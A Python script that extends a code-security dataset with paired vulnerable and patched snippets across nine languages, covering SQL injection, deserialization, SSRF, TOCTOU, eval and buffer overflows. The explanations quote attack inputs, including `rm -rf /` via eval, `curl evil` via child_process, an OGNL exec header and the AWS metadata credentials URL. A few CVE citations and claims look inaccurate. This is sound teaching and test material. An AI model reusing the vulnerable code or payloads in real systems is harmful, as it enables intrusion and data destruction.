#!/usr/bin/env python3
"""Phase 2 expansion of bet 7 code-security bank (v0.9.19).

Phase 1 (v0.9.17) brought the bank from 12 to 32 patterns across 7
languages. Phase 2 adds 30 more patterns focusing on:
  - Rust (3), C# (3), Swift (2), Kotlin (2) for language coverage
  - More Python (4), JavaScript (3), Java (3), Go (3), C (3),
    PHP (2), Ruby (1) for additional CWEs the previous 32 missed

New CWE classes introduced: 367 TOCTOU, 362 race condition, 90 LDAP
injection, 1336 OGNL/EL injection, 113 HTTP header injection, 434
unrestricted upload, 798 hardcoded JWT secret, 95 eval injection.

Idempotent: re-running skips IDs already present.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
BANK = REPO_ROOT / "data" / "raw" / "code_security_patterns.jsonl"


NEW_PATTERNS = [
    # ---- Rust ------------------------------------------------------------
    {
        "id": "PAT-033", "cwe": "CWE-787",
        "name": "Rust unsafe pointer arithmetic out of bounds",
        "language": "rust",
        "vulnerable": (
            "fn read_at(buf: &[u8], idx: usize) -> u8 {\n"
            "    unsafe { *buf.as_ptr().add(idx) }\n"
            "}"
        ),
        "patched": (
            "fn read_at(buf: &[u8], idx: usize) -> Option<u8> {\n"
            "    buf.get(idx).copied()\n"
            "}"
        ),
        "explanation": (
            "`as_ptr().add(idx)` skips the bounds check the safe "
            "indexer performs; an `idx >= buf.len()` reads past the "
            "buffer and returns whatever is in adjacent memory, which "
            "may be uninitialised heap or attacker-controlled. The "
            "patched version uses the safe `get` method which returns "
            "`Option<&u8>` so callers handle out-of-bounds explicitly. "
            "The Rust answer is almost always: drop `unsafe` if a safe "
            "alternative exists."
        ),
        "cve_examples": ["CVE-2018-1000657"],
    },
    {
        "id": "PAT-034", "cwe": "CWE-330",
        "name": "Rust thread_rng for security-sensitive tokens",
        "language": "rust",
        "vulnerable": (
            "use rand::Rng;\n"
            "fn token() -> [u8; 32] {\n"
            "    let mut buf = [0u8; 32];\n"
            "    rand::thread_rng().fill(&mut buf);\n"
            "    buf\n"
            "}"
        ),
        "patched": (
            "use rand::rngs::OsRng;\n"
            "use rand::RngCore;\n"
            "fn token() -> [u8; 32] {\n"
            "    let mut buf = [0u8; 32];\n"
            "    OsRng.fill_bytes(&mut buf);\n"
            "    buf\n"
            "}"
        ),
        "explanation": (
            "`thread_rng()` returns ThreadRng, which is automatically "
            "seeded from the OS but is documented as 'not "
            "cryptographically secure' in some Rust versions. For "
            "session tokens, IVs, nonces, key material, use `OsRng` "
            "directly: it reads from the OS CSPRNG (`getrandom` on "
            "Linux, `BCryptGenRandom` on Windows). For sub-millisecond "
            "non-security uses, ThreadRng is fine."
        ),
        "cve_examples": [],
    },
    {
        "id": "PAT-035", "cwe": "CWE-89",
        "name": "Rust SQL injection via format! into raw query",
        "language": "rust",
        "vulnerable": (
            "use sqlx::PgPool;\n"
            "async fn lookup(pool: &PgPool, name: &str) "
            "-> sqlx::Result<i64> {\n"
            "    let q = format!(\n"
            "      \"SELECT id FROM users WHERE name = '{}'\", name);\n"
            "    let row: (i64,) = sqlx::query_as(&q)"
            ".fetch_one(pool).await?;\n"
            "    Ok(row.0)\n"
            "}"
        ),
        "patched": (
            "use sqlx::PgPool;\n"
            "async fn lookup(pool: &PgPool, name: &str) "
            "-> sqlx::Result<i64> {\n"
            "    let row: (i64,) = sqlx::query_as(\n"
            "      \"SELECT id FROM users WHERE name = $1\")\n"
            "      .bind(name).fetch_one(pool).await?;\n"
            "    Ok(row.0)\n"
            "}"
        ),
        "explanation": (
            "`format!` builds the query text from the input, so a "
            "name of `' OR true --` returns the first row. sqlx and "
            "diesel both support parameter binding via `$1`/`?` "
            "placeholders; the database driver sends the SQL template "
            "and parameters separately so the value is never "
            "concatenated. sqlx also has the `query!` and `query_as!` "
            "compile-time-checked macros that catch this at build time."
        ),
        "cve_examples": [],
    },
    # ---- C# / .NET -------------------------------------------------------
    {
        "id": "PAT-036", "cwe": "CWE-89",
        "name": "C# SqlCommand with string concatenation",
        "language": "csharp",
        "vulnerable": (
            "using var cmd = new SqlCommand(\n"
            "    \"SELECT id FROM users WHERE name = '\" + name + \"'\",\n"
            "    conn);\n"
            "var id = cmd.ExecuteScalar();"
        ),
        "patched": (
            "using var cmd = new SqlCommand(\n"
            "    \"SELECT id FROM users WHERE name = @name\", conn);\n"
            "cmd.Parameters.AddWithValue(\"@name\", name);\n"
            "var id = cmd.ExecuteScalar();"
        ),
        "explanation": (
            "Concatenating `name` into the SQL text lets `' OR 1=1 --` "
            "bypass the WHERE. `SqlCommand` supports named parameters "
            "via `@name` plus `Parameters.AddWithValue`; the .NET "
            "runtime sends the parameter to SQL Server as a typed "
            "value, never as text. Entity Framework Core's "
            "`FromSqlInterpolated` is the equivalent for LINQ queries."
        ),
        "cve_examples": ["CVE-2020-1147"],
    },
    {
        "id": "PAT-037", "cwe": "CWE-502",
        "name": "C# BinaryFormatter.Deserialize on untrusted input",
        "language": "csharp",
        "vulnerable": (
            "using System.IO;\n"
            "using System.Runtime.Serialization.Formatters.Binary;\n"
            "object Load(byte[] data) {\n"
            "    var f = new BinaryFormatter();\n"
            "    using var ms = new MemoryStream(data);\n"
            "    return f.Deserialize(ms);\n"
            "}"
        ),
        "patched": (
            "using System.Text.Json;\n"
            "MyDto Load(byte[] data) {\n"
            "    return JsonSerializer.Deserialize<MyDto>(data) "
            "?? throw new FormatException(\"invalid payload\");\n"
            "}"
        ),
        "explanation": (
            "`BinaryFormatter.Deserialize` is the .NET equivalent of "
            "Java's ObjectInputStream: it instantiates whatever type "
            "the serialized bytes name, with all the gadget-chain "
            "consequences. Microsoft has officially deprecated "
            "BinaryFormatter; .NET 5+ marks it obsolete. Use "
            "`System.Text.Json` or `Newtonsoft.Json` with explicit "
            "type binding instead, neither of which calls "
            "constructor-time logic on untrusted types."
        ),
        "cve_examples": ["CVE-2017-9424"],
    },
    {
        "id": "PAT-038", "cwe": "CWE-79",
        "name": "C# raw HTML output in ASP.NET Razor",
        "language": "csharp",
        "vulnerable": (
            "@{ var name = Request.Query[\"name\"]; }\n"
            "<h1>Hello @Html.Raw(name)</h1>"
        ),
        "patched": (
            "@{ var name = Request.Query[\"name\"]; }\n"
            "<h1>Hello @name</h1>"
        ),
        "explanation": (
            "`@Html.Raw(name)` writes the input verbatim, so a query "
            "of `?name=<script>alert(1)</script>` triggers stored XSS "
            "if the page is cached. Razor's default `@expr` HTML-"
            "encodes its argument, so the same input becomes "
            "`&lt;script&gt;...` and renders as text. Use `Html.Raw` "
            "only for trusted markup — content you control or have "
            "already validated through a whitelist."
        ),
        "cve_examples": [],
    },
    # ---- Swift -----------------------------------------------------------
    {
        "id": "PAT-039", "cwe": "CWE-89",
        "name": "Swift SQLite injection via String concatenation",
        "language": "swift",
        "vulnerable": (
            "func find(name: String) -> Int? {\n"
            "    let sql = \"SELECT id FROM users WHERE name = '\\("
            "name)'\"\n"
            "    var stmt: OpaquePointer?\n"
            "    sqlite3_prepare_v2(db, sql, -1, &stmt, nil)\n"
            "    return sqlite3_step(stmt) == SQLITE_ROW\n"
            "        ? Int(sqlite3_column_int(stmt, 0)) : nil\n"
            "}"
        ),
        "patched": (
            "func find(name: String) -> Int? {\n"
            "    let sql = \"SELECT id FROM users WHERE name = ?\"\n"
            "    var stmt: OpaquePointer?\n"
            "    sqlite3_prepare_v2(db, sql, -1, &stmt, nil)\n"
            "    sqlite3_bind_text(stmt, 1, name,\n"
            "        Int32(name.utf8.count), SQLITE_TRANSIENT)\n"
            "    return sqlite3_step(stmt) == SQLITE_ROW\n"
            "        ? Int(sqlite3_column_int(stmt, 0)) : nil\n"
            "}"
        ),
        "explanation": (
            "Swift string interpolation builds the SQL text directly, "
            "so a name of `' OR 1=1 --` bypasses the predicate. "
            "`sqlite3_bind_text` with a `?` placeholder sends the "
            "parameter to SQLite separately; the value can never be "
            "interpreted as SQL syntax. Higher-level libraries "
            "(GRDB, SQLite.swift) wrap this safely by default."
        ),
        "cve_examples": [],
    },
    {
        "id": "PAT-040", "cwe": "CWE-798",
        "name": "Swift hardcoded API key in source",
        "language": "swift",
        "vulnerable": (
            "let apiKey = \"sk-live-9f8c7e6d5b4a3c2d1e0f9a8b7c6d5e4f\"\n"
            "var request = URLRequest(url: url)\n"
            "request.setValue(\"Bearer \\(apiKey)\",\n"
            "                  forHTTPHeaderField: \"Authorization\")"
        ),
        "patched": (
            "guard let apiKey = ProcessInfo.processInfo\n"
            "    .environment[\"API_KEY\"], !apiKey.isEmpty else {\n"
            "    fatalError(\"API_KEY environment variable not set\")\n"
            "}\n"
            "var request = URLRequest(url: url)\n"
            "request.setValue(\"Bearer \\(apiKey)\",\n"
            "                  forHTTPHeaderField: \"Authorization\")"
        ),
        "explanation": (
            "Hardcoding a live API key in app source ships it to "
            "every install, including reverse-engineered IPAs. Anyone "
            "decompiling the binary recovers the key and can exhaust "
            "your quota or impersonate your service. iOS apps in "
            "particular ship as IPA bundles that are trivial to "
            "extract; use Keychain (for per-user secrets) or backend-"
            "issued short-lived tokens instead. Environment variables "
            "are correct for CLI tools and server processes, not iOS "
            "apps."
        ),
        "cve_examples": [],
    },
    # ---- Kotlin ----------------------------------------------------------
    {
        "id": "PAT-041", "cwe": "CWE-502",
        "name": "Kotlin ObjectInputStream deserialization",
        "language": "kotlin",
        "vulnerable": (
            "import java.io.*\n"
            "fun load(data: ByteArray): Any =\n"
            "    ObjectInputStream(ByteArrayInputStream(data))"
            ".readObject()"
        ),
        "patched": (
            "import com.fasterxml.jackson.module.kotlin.jacksonObjectMapper\n"
            "import com.fasterxml.jackson.module.kotlin.readValue\n"
            "private val mapper = jacksonObjectMapper()\n"
            "inline fun <reified T : Any> load(data: ByteArray): T =\n"
            "    mapper.readValue(data)"
        ),
        "explanation": (
            "Kotlin sits on top of the JVM, so it inherits Java's "
            "ObjectInputStream gadget-chain attacks (Apache Commons, "
            "Spring). Jackson with the kotlin module deserializes "
            "into a known sealed type T at compile time; unknown "
            "types or extra fields fail the parse rather than "
            "instantiating attacker-named classes."
        ),
        "cve_examples": ["CVE-2017-5638"],
    },
    {
        "id": "PAT-042", "cwe": "CWE-89",
        "name": "Kotlin Spring JdbcTemplate string concat",
        "language": "kotlin",
        "vulnerable": (
            "import org.springframework.jdbc.core.JdbcTemplate\n"
            "fun findUser(jdbc: JdbcTemplate, name: String): Long =\n"
            "    jdbc.queryForObject(\n"
            "      \"SELECT id FROM users WHERE name = '$name'\",\n"
            "      Long::class.java) ?: -1"
        ),
        "patched": (
            "import org.springframework.jdbc.core.JdbcTemplate\n"
            "fun findUser(jdbc: JdbcTemplate, name: String): Long =\n"
            "    jdbc.queryForObject(\n"
            "      \"SELECT id FROM users WHERE name = ?\",\n"
            "      Long::class.java, name) ?: -1"
        ),
        "explanation": (
            "Kotlin string templates (`$name`) interpolate at compile "
            "time but produce the same vulnerable concatenation as "
            "Java's `+`. JdbcTemplate's overload accepts varargs that "
            "bind as positional parameters; `?` is the placeholder. "
            "If you find yourself using `$` in SQL, that is the "
            "smell — switch to placeholders or use a higher-level "
            "library (Exposed, jOOQ) that prevents this."
        ),
        "cve_examples": [],
    },
    # ---- More Python -----------------------------------------------------
    {
        "id": "PAT-043", "cwe": "CWE-367",
        "name": "Python TOCTOU race on file existence check",
        "language": "python",
        "vulnerable": (
            "import os\n"
            "def write_log(path: str, line: str):\n"
            "    if not os.path.exists(path):\n"
            "        with open(path, 'w') as f:\n"
            "            f.write(line)"
        ),
        "patched": (
            "import os\n"
            "def write_log(path: str, line: str):\n"
            "    fd = os.open(path,\n"
            "      os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)\n"
            "    with os.fdopen(fd, 'w') as f:\n"
            "        f.write(line)"
        ),
        "explanation": (
            "Time-of-check to time-of-use. Between `os.path.exists` "
            "and `open(..., 'w')`, an attacker who controls the "
            "filename's directory can `ln -s /etc/passwd path`, and "
            "the open follows the symlink and clobbers system files. "
            "`os.open(..., O_EXCL | O_CREAT)` is atomic: the syscall "
            "fails if the file exists at the moment of open, so there "
            "is no window for the race. This is the canonical Unix "
            "fix for TOCTOU on creation."
        ),
        "cve_examples": ["CVE-2017-1000366", "CVE-2019-13139"],
    },
    {
        "id": "PAT-044", "cwe": "CWE-95",
        "name": "Python eval on user input",
        "language": "python",
        "vulnerable": (
            "def calculate(expr: str) -> float:\n"
            "    return eval(expr)"
        ),
        "patched": (
            "import ast, operator\n"
            "_OPS = {ast.Add: operator.add, ast.Sub: operator.sub,\n"
            "        ast.Mult: operator.mul, ast.Div: operator.truediv}\n"
            "def calculate(expr: str) -> float:\n"
            "    def _eval(node):\n"
            "        if isinstance(node, ast.Constant):\n"
            "            return node.value\n"
            "        if isinstance(node, ast.BinOp):\n"
            "            return _OPS[type(node.op)](_eval(node.left),\n"
            "                                        _eval(node.right))\n"
            "        raise ValueError('disallowed expression')\n"
            "    return _eval(ast.parse(expr, mode='eval').body)"
        ),
        "explanation": (
            "`eval(expr)` runs arbitrary Python: an input of "
            "`__import__('os').system('rm -rf /')` triggers RCE. The "
            "patched version parses to AST and walks the tree, "
            "permitting only literals and a whitelist of arithmetic "
            "operators. Function calls, attribute access, name "
            "lookups all raise ValueError. For real expression "
            "evaluation use a library like `simpleeval` that already "
            "implements this safely."
        ),
        "cve_examples": ["CVE-2017-9807"],
    },
    {
        "id": "PAT-045", "cwe": "CWE-209",
        "name": "Python verbose error leaks stack trace to client",
        "language": "python",
        "vulnerable": (
            "from flask import Flask, jsonify\n"
            "import traceback\n"
            "app = Flask(__name__)\n"
            "@app.errorhandler(Exception)\n"
            "def handle(e):\n"
            "    return jsonify({'error': str(e),\n"
            "                     'trace': traceback.format_exc()}), 500"
        ),
        "patched": (
            "import logging, uuid\n"
            "from flask import Flask, jsonify\n"
            "log = logging.getLogger(__name__)\n"
            "app = Flask(__name__)\n"
            "@app.errorhandler(Exception)\n"
            "def handle(e):\n"
            "    ref = uuid.uuid4().hex[:12]\n"
            "    log.exception('error_id=%s', ref)\n"
            "    return jsonify({'error': 'internal error',\n"
            "                     'reference': ref}), 500"
        ),
        "explanation": (
            "Returning the stack trace + exception message to "
            "untrusted clients leaks: filesystem layout, library "
            "versions, internal class names, sometimes secrets that "
            "appear in repr() output. The patched version logs the "
            "trace server-side keyed by a random reference id, then "
            "returns only the id to the client. Operators correlate "
            "client-reported reference ids back to the full trace in "
            "the log."
        ),
        "cve_examples": ["CVE-2018-1000805"],
    },
    {
        "id": "PAT-046", "cwe": "CWE-352",
        "name": "Python Flask form without CSRF token",
        "language": "python",
        "vulnerable": (
            "from flask import Flask, request, redirect\n"
            "app = Flask(__name__)\n"
            "@app.post('/transfer')\n"
            "def transfer():\n"
            "    amount = request.form['amount']\n"
            "    target = request.form['target']\n"
            "    do_transfer(current_user(), target, amount)\n"
            "    return redirect('/dashboard')"
        ),
        "patched": (
            "from flask import Flask, request, redirect\n"
            "from flask_wtf.csrf import CSRFProtect, validate_csrf\n"
            "app = Flask(__name__)\n"
            "CSRFProtect(app)\n"
            "@app.post('/transfer')\n"
            "def transfer():\n"
            "    validate_csrf(request.form.get('csrf_token'))\n"
            "    amount = request.form['amount']\n"
            "    target = request.form['target']\n"
            "    do_transfer(current_user(), target, amount)\n"
            "    return redirect('/dashboard')"
        ),
        "explanation": (
            "Without a CSRF token, an attacker hosts a page with a "
            "form auto-submitting to /transfer; when a logged-in "
            "victim visits, the browser sends the session cookie and "
            "the transfer happens. flask-wtf's CSRFProtect requires a "
            "per-session token in every state-changing form; the "
            "attacker's page can't include the token because the "
            "Same-Origin Policy blocks cross-origin reads. The "
            "alternative is the SameSite=Strict cookie attribute, "
            "which mitigates but doesn't fully replace explicit CSRF "
            "tokens for older browsers."
        ),
        "cve_examples": ["CVE-2020-13927"],
    },
    # ---- More JavaScript -------------------------------------------------
    {
        "id": "PAT-047", "cwe": "CWE-918",
        "name": "JavaScript SSRF via unrestricted axios fetch",
        "language": "javascript",
        "vulnerable": (
            "const axios = require('axios');\n"
            "async function fetchPreview(url) {\n"
            "  const r = await axios.get(url, { timeout: 5000 });\n"
            "  return r.data;\n"
            "}"
        ),
        "patched": (
            "const axios = require('axios');\n"
            "const { URL } = require('url');\n"
            "const dns = require('dns').promises;\n"
            "const net = require('net');\n"
            "async function fetchPreview(rawUrl) {\n"
            "  const u = new URL(rawUrl);\n"
            "  if (!['http:', 'https:'].includes(u.protocol)) "
            "throw new Error('bad scheme');\n"
            "  const { address } = await dns.lookup(u.hostname);\n"
            "  const ip = net.isIP(address);\n"
            "  if (ip === 0) throw new Error('bad host');\n"
            "  // Block private + loopback ranges.\n"
            "  if (/^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|"
            "169\\.254\\.)/.test(address)) {\n"
            "    throw new Error('private address blocked');\n"
            "  }\n"
            "  const r = await axios.get(rawUrl, { timeout: 5000 });\n"
            "  return r.data;\n"
            "}"
        ),
        "explanation": (
            "An unrestricted fetch lets the attacker trigger your "
            "server to request `http://169.254.169.254/latest/meta-"
            "data/iam/security-credentials/...` (AWS IMDS) and steal "
            "the instance role's credentials. The patched version "
            "resolves the hostname, blocks RFC 1918 + loopback + "
            "link-local addresses, and only then dispatches the "
            "request. Note: TOCTOU on DNS rebinding is a separate "
            "concern; the safe pattern is to resolve once and pass "
            "the resolved IP to the HTTP client."
        ),
        "cve_examples": ["CVE-2019-14322", "CVE-2020-7616"],
    },
    {
        "id": "PAT-048", "cwe": "CWE-798",
        "name": "JavaScript hardcoded JWT secret",
        "language": "javascript",
        "vulnerable": (
            "const jwt = require('jsonwebtoken');\n"
            "const SECRET = 'change-me-in-prod';\n"
            "function sign(payload) {\n"
            "  return jwt.sign(payload, SECRET);\n"
            "}"
        ),
        "patched": (
            "const jwt = require('jsonwebtoken');\n"
            "const SECRET = process.env.JWT_SECRET;\n"
            "if (!SECRET || SECRET.length < 32) {\n"
            "  throw new Error("
            "'JWT_SECRET must be set, >= 32 chars');\n"
            "}\n"
            "function sign(payload) {\n"
            "  return jwt.sign(payload, SECRET, { algorithm: 'HS256',\n"
            "                                       expiresIn: '1h' });\n"
            "}"
        ),
        "explanation": (
            "Hardcoded secrets ship with the source: anyone with "
            "git access can forge tokens. 'change-me-in-prod' "
            "specifically is searchable on GitHub (thousands of "
            "hits), so an attacker doesn't even need access to your "
            "code to guess it. Read the secret from an env variable "
            "or a secret manager, fail loudly at startup if it's "
            "missing or too short, and pin algorithm + expiry on "
            "every sign call."
        ),
        "cve_examples": ["CVE-2020-26244"],
    },
    {
        "id": "PAT-049", "cwe": "CWE-95",
        "name": "JavaScript eval on user input",
        "language": "javascript",
        "vulnerable": (
            "function calc(expr) {\n"
            "  return eval(expr);\n"
            "}"
        ),
        "patched": (
            "// Use a real expression parser; never eval untrusted text.\n"
            "const { evaluate } = require('mathjs');\n"
            "function calc(expr) {\n"
            "  return evaluate(expr, /* limited scope */ {});\n"
            "}"
        ),
        "explanation": (
            "`eval('process.exit(1)')` kills the Node server; "
            "`eval(\"require('child_process').execSync('curl evil')\")` "
            "is RCE. Browser eval has fewer privileges than Node but "
            "still steals cookies and exfiltrates data. Use a real "
            "expression library (mathjs, expr-eval) which parses to "
            "an AST and only evaluates a whitelisted operator set. "
            "If you genuinely need to run user code, sandbox via "
            "`vm2` (which has its own escapes) or better yet a "
            "worker thread with restricted globals."
        ),
        "cve_examples": ["CVE-2020-7676"],
    },
    # ---- More Java -------------------------------------------------------
    {
        "id": "PAT-050", "cwe": "CWE-90",
        "name": "Java LDAP injection via DirContext.search",
        "language": "java",
        "vulnerable": (
            "import javax.naming.directory.*;\n"
            "public class LdapSearch {\n"
            "  public NamingEnumeration<?> findUser(\n"
            "      DirContext ctx, String username)\n"
            "      throws NamingException {\n"
            "    String filter =\n"
            "      \"(uid=\" + username + \")\";\n"
            "    return ctx.search(\"ou=users\", filter, new SearchControls());\n"
            "  }\n"
            "}"
        ),
        "patched": (
            "import javax.naming.directory.*;\n"
            "public class LdapSearch {\n"
            "  public NamingEnumeration<?> findUser(\n"
            "      DirContext ctx, String username)\n"
            "      throws NamingException {\n"
            "    String filter = \"(uid={0})\";\n"
            "    return ctx.search(\"ou=users\", filter,\n"
            "                       new Object[] { username },\n"
            "                       new SearchControls());\n"
            "  }\n"
            "}"
        ),
        "explanation": (
            "Concatenating `username` into the filter lets an input "
            "of `*)(uid=*` produce `(uid=*)(uid=*)` which matches "
            "every directory entry; combined with a password search "
            "this is full directory enumeration and auth bypass. The "
            "patched version uses JNDI's parameterised filter form: "
            "`{0}` is replaced with the bound argument after escaping "
            "LDAP special characters. Spring LdapTemplate has the "
            "same pattern via `LdapQueryBuilder`."
        ),
        "cve_examples": ["CVE-2018-1320"],
    },
    {
        "id": "PAT-051", "cwe": "CWE-1336",
        "name": "Java Struts2 OGNL expression injection",
        "language": "java",
        "vulnerable": (
            "// Struts2 action accepting arbitrary OGNL via\n"
            "// the Content-Type header (as in CVE-2017-5638).\n"
            "// pseudo-code: Struts evaluated this header as OGNL.\n"
            "public String execute() {\n"
            "  String ct = request.getHeader(\"Content-Type\");\n"
            "  ognlContext.evaluate(ct);  // historical Struts2 default\n"
            "  return SUCCESS;\n"
            "}"
        ),
        "patched": (
            "// Upgrade to Struts >= 2.3.32 / 2.5.10.1 which disables\n"
            "// OGNL evaluation of arbitrary headers, OR validate +\n"
            "// reject Content-Type that doesn't match the\n"
            "// expected media-type set.\n"
            "public String execute() {\n"
            "  String ct = request.getHeader(\"Content-Type\");\n"
            "  if (!ALLOWED_CTS.contains(stripParams(ct))) {\n"
            "    return ERROR;\n"
            "  }\n"
            "  return SUCCESS;\n"
            "}"
        ),
        "explanation": (
            "OGNL is Struts2's expression language; older Struts "
            "evaluated certain HTTP headers (Content-Type in 2017's "
            "Equifax incident) as OGNL, so an attacker-controlled "
            "header like `%{(#_='multipart/form-data')." +
            "(@java.lang.Runtime@getRuntime().exec('whoami'))}` "
            "executes shell commands. The structural fix is the "
            "Struts upgrade; defense in depth adds Content-Type "
            "allowlisting at the WAF or app layer."
        ),
        "cve_examples": ["CVE-2017-5638"],
    },
    {
        "id": "PAT-052", "cwe": "CWE-113",
        "name": "Java HTTP response splitting via setHeader",
        "language": "java",
        "vulnerable": (
            "import javax.servlet.http.*;\n"
            "public class RedirectServlet extends HttpServlet {\n"
            "  protected void doGet(HttpServletRequest req,\n"
            "                         HttpServletResponse resp) {\n"
            "    String dest = req.getParameter(\"dest\");\n"
            "    resp.setHeader(\"Location\", dest);\n"
            "    resp.setStatus(302);\n"
            "  }\n"
            "}"
        ),
        "patched": (
            "import javax.servlet.http.*;\n"
            "import java.util.Set;\n"
            "public class RedirectServlet extends HttpServlet {\n"
            "  private static final Set<String> ALLOWED =\n"
            "    Set.of(\"/dashboard\", \"/profile\", \"/help\");\n"
            "  protected void doGet(HttpServletRequest req,\n"
            "                         HttpServletResponse resp) {\n"
            "    String dest = req.getParameter(\"dest\");\n"
            "    if (dest == null || !ALLOWED.contains(dest)) {\n"
            "      dest = \"/dashboard\";\n"
            "    }\n"
            "    resp.setHeader(\"Location\", dest);\n"
            "    resp.setStatus(302);\n"
            "  }\n"
            "}"
        ),
        "explanation": (
            "If `dest` contains `\\r\\n` plus crafted headers, older "
            "servlet containers split the response and an attacker "
            "can inject `Set-Cookie` or HTML body. Modern containers "
            "(Tomcat, Jetty) reject CRLF in setHeader values, "
            "mitigating splitting, but that doesn't address the "
            "open-redirect case where a victim is sent to "
            "`https://evil.example/`. The patched version restricts "
            "destinations to a server-known allowlist; arbitrary "
            "user-controlled redirects are the actual vulnerability."
        ),
        "cve_examples": ["CVE-2007-5333"],
    },
    # ---- More Go ---------------------------------------------------------
    {
        "id": "PAT-053", "cwe": "CWE-367",
        "name": "Go TOCTOU on os.Stat then os.Open",
        "language": "go",
        "vulnerable": (
            "func readUpload(path string) ([]byte, error) {\n"
            "  if _, err := os.Stat(path); err != nil {\n"
            "    return nil, err\n"
            "  }\n"
            "  return os.ReadFile(path)\n"
            "}"
        ),
        "patched": (
            "func readUpload(path string) ([]byte, error) {\n"
            "  f, err := os.OpenFile(path, os.O_RDONLY|syscall.O_NOFOLLOW, 0)\n"
            "  if err != nil { return nil, err }\n"
            "  defer f.Close()\n"
            "  st, err := f.Stat()\n"
            "  if err != nil || !st.Mode().IsRegular() { return nil, errors.New(\"not regular\") }\n"
            "  return io.ReadAll(f)\n"
            "}"
        ),
        "explanation": (
            "Between Stat and ReadFile, an attacker who controls the "
            "directory can swap the file for a symlink to /etc/passwd. "
            "The patched version opens once with O_NOFOLLOW (refuses "
            "to follow symlinks at the final component), then stats "
            "the open file descriptor (which is immune to swap). The "
            "additional IsRegular check rejects pipes / device nodes."
        ),
        "cve_examples": ["CVE-2018-16873"],
    },
    {
        "id": "PAT-054", "cwe": "CWE-113",
        "name": "Go HTTP header injection via Set-Cookie",
        "language": "go",
        "vulnerable": (
            "func login(w http.ResponseWriter, r *http.Request) {\n"
            "  username := r.URL.Query().Get(\"u\")\n"
            "  w.Header().Set(\"Set-Cookie\",\n"
            "    fmt.Sprintf(\"user=%s; Path=/\", username))\n"
            "  fmt.Fprintln(w, \"ok\")\n"
            "}"
        ),
        "patched": (
            "func login(w http.ResponseWriter, r *http.Request) {\n"
            "  username := r.URL.Query().Get(\"u\")\n"
            "  http.SetCookie(w, &http.Cookie{\n"
            "    Name: \"user\", Value: username, Path: \"/\",\n"
            "    HttpOnly: true, Secure: true,\n"
            "    SameSite: http.SameSiteLaxMode,\n"
            "  })\n"
            "  fmt.Fprintln(w, \"ok\")\n"
            "}"
        ),
        "explanation": (
            "If `username` contains `\\r\\n`, raw Set-Cookie writes "
            "split the response. `http.SetCookie` writes through "
            "Cookie's String() method which sanitises the value and "
            "strips control characters. As a bonus, the patched "
            "version sets HttpOnly + Secure + SameSite, which "
            "mitigate XSS-driven cookie theft and CSRF respectively."
        ),
        "cve_examples": [],
    },
    {
        "id": "PAT-055", "cwe": "CWE-918",
        "name": "Go SSRF via unvalidated http.Get",
        "language": "go",
        "vulnerable": (
            "func fetchPreview(rawURL string) ([]byte, error) {\n"
            "  resp, err := http.Get(rawURL)\n"
            "  if err != nil { return nil, err }\n"
            "  defer resp.Body.Close()\n"
            "  return io.ReadAll(resp.Body)\n"
            "}"
        ),
        "patched": (
            "var blocked = []*net.IPNet{\n"
            "  mustCIDR(\"127.0.0.0/8\"), mustCIDR(\"10.0.0.0/8\"),\n"
            "  mustCIDR(\"172.16.0.0/12\"), mustCIDR(\"192.168.0.0/16\"),\n"
            "  mustCIDR(\"169.254.0.0/16\"),\n"
            "}\n"
            "func fetchPreview(rawURL string) ([]byte, error) {\n"
            "  u, err := url.Parse(rawURL)\n"
            "  if err != nil || (u.Scheme != \"http\" && u.Scheme != \"https\") {\n"
            "    return nil, errors.New(\"bad url\")\n"
            "  }\n"
            "  ips, err := net.LookupIP(u.Hostname())\n"
            "  if err != nil { return nil, err }\n"
            "  for _, ip := range ips {\n"
            "    for _, b := range blocked {\n"
            "      if b.Contains(ip) { return nil, errors.New(\"blocked\") }\n"
            "    }\n"
            "  }\n"
            "  resp, err := http.Get(rawURL)\n"
            "  if err != nil { return nil, err }\n"
            "  defer resp.Body.Close()\n"
            "  return io.ReadAll(resp.Body)\n"
            "}"
        ),
        "explanation": (
            "Same SSRF concern as the Node case: an unrestricted "
            "fetch lets the attacker reach AWS IMDS at 169.254.169.254 "
            "and exfiltrate instance role credentials. The patched "
            "version validates the scheme, resolves the hostname to "
            "IPs, and rejects RFC 1918 + link-local + loopback ranges. "
            "Production code should also bound the response size and "
            "follow-redirect policy."
        ),
        "cve_examples": ["CVE-2021-21330"],
    },
    # ---- More C ----------------------------------------------------------
    {
        "id": "PAT-056", "cwe": "CWE-122",
        "name": "C heap buffer overflow via memcpy of attacker-sized input",
        "language": "c",
        "vulnerable": (
            "#include <string.h>\n"
            "#include <stdlib.h>\n"
            "void store(const char *src, size_t src_len) {\n"
            "    char *dst = malloc(64);\n"
            "    memcpy(dst, src, src_len);\n"
            "}"
        ),
        "patched": (
            "#include <string.h>\n"
            "#include <stdlib.h>\n"
            "int store(const char *src, size_t src_len) {\n"
            "    if (src_len > 64) return -1;\n"
            "    char *dst = malloc(64);\n"
            "    if (!dst) return -1;\n"
            "    memcpy(dst, src, src_len);\n"
            "    return 0;\n"
            "}"
        ),
        "explanation": (
            "The vulnerable version copies `src_len` bytes into a "
            "64-byte heap buffer; if `src_len > 64`, you've corrupted "
            "the heap, which an attacker leverages for code execution "
            "via heap grooming + control-flow hijack. The patched "
            "version bounds `src_len` against the destination size "
            "before the copy. AddressSanitizer (`-fsanitize=address`) "
            "catches this at runtime; modern compilers' "
            "FORTIFY_SOURCE catches some patterns at compile time."
        ),
        "cve_examples": ["CVE-2017-9078", "CVE-2020-1971"],
    },
    {
        "id": "PAT-057", "cwe": "CWE-362",
        "name": "C race condition on shared global counter",
        "language": "c",
        "vulnerable": (
            "#include <pthread.h>\n"
            "static int counter = 0;\n"
            "void *worker(void *arg) {\n"
            "    for (int i = 0; i < 1000; i++) counter++;\n"
            "    return NULL;\n"
            "}"
        ),
        "patched": (
            "#include <pthread.h>\n"
            "#include <stdatomic.h>\n"
            "static atomic_int counter = 0;\n"
            "void *worker(void *arg) {\n"
            "    for (int i = 0; i < 1000; i++)\n"
            "        atomic_fetch_add(&counter, 1);\n"
            "    return NULL;\n"
            "}"
        ),
        "explanation": (
            "`counter++` is read-modify-write on a non-atomic int, "
            "which is three machine instructions and can interleave "
            "across threads, losing increments. In a security context "
            "the same pattern on a TOCTOU 'is this user logged in' "
            "check is the actual bug class. C11's `<stdatomic.h>` "
            "gives sequentially consistent atomics; mutexes work too "
